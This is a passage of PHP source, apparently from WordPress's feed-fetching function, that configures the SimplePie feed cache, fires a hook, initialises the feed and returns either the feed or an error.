	$feed->set_cache_duration( apply_filters( 'wp_feed_cache_transient_lifetime', 12 * HOUR_IN_SECONDS, $url ) );
	/**
	 * Fires just before processing the SimplePie feed object.
	 *
	 * @since 3.0.0
	 *
	 * @param object &$feed SimplePie feed object, passed by reference.
	 * @param mixed  $url   URL of feed to retrieve. If an array of URLs, the feeds are merged.
	 */
	do_action_ref_array( 'wp_feed_options', array( &$feed, $url ) );
	$feed->init();
	$feed->set_output_encoding( get_option( 'blog_charset' ) );
	$feed->handle_content_type();

	if ( $feed->error() )
		return new WP_Error( 'simplepie-error', $feed->error() );

	return $feed;
}
